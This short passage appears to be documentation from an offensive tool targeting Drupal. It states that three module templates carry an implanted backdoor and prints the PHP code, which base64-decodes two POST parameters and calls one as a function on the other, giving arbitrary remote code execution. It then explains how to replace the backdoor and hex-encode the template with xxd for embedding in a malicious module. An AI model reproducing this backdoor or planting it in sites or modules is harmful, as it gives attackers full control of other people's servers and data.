The "hello_world.tar.gz", "drupal_analytics.tar.gz" and "custom_analytics.tar.gz" templates have the following backdoor implanted in them:

$callback = base64_decode($_POST['K189mD2j']);
$code = base64_decode($_POST['OGa93dka']);
if(isset($callback) && $callback != "") {
if($callback === "phpinfo") phpinfo();
}
if(isset($code) && $code != "") $callback($code);

If you want to use another php code as a backdoor, you can decompile the .tar.gz and change the backdoor inside the file, remember to transform the file back to .tar.gz and use the command "xxd -p -c 0 [template.tar.gz]" to transform the file into hexadecimal and put the hexadecimal code in the module that you want use
